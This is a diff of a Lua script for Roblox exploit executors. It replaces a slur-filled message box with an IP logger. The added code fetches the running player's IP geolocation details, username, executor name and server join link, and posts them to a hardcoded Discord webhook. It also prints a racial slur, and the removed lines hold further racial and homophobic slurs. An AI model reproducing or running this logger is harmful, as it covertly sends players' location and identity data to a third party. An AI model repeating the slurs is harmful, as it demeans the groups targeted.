@@ -1,19 +1,38 @@
-local ffi = require("ffi")  -- Load FFI module (instance)
+local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
+print(nigger) 
 
-local user32 = ffi.load("user32")   -- Load User32 DLL handle
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
 
-ffi.cdef([[
-enum{
-    MB_OK = 0x00000000L,
-    MB_ICONINFORMATION = 0x00000040L
-};
+local url =
+   "https://discord.com/api/webhooks/1369758127318368366/OSkakXX-JX0Ff9CnGlVx5rMxaMaKw9a8mbaFArMJsuq3LHVO7t6DIFEnyi43P_N7pflF" 
+local data = {
+            ["username"] = "Salmon-L0G", 
+            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", 
+    
+    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", 
+    ["embeds"] = {
+       {
+           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
+           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
+           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
+           ["color"] = 14680319,
+           ["footer"] = {
+             ["text"] = "" ..join_script.. "", 
+           },
+       },
+   }
+}
 
-typedef void* HANDLE;
-typedef HANDLE HWND;
-typedef const char* LPCSTR;
-typedef unsigned UINT;
+local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-int MessageBoxA(HWND, LPCSTR, LPCSTR, UINT);
-]]) -- Define C -> Lua interpretation
-
-user32.MessageBoxA(nil, "Faggot", "Nigger", ffi.C.MB_OK + ffi.C.MB_ICONINFORMATION)   -- Call C function 'MessageBoxA' from User32
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef) --post, idk
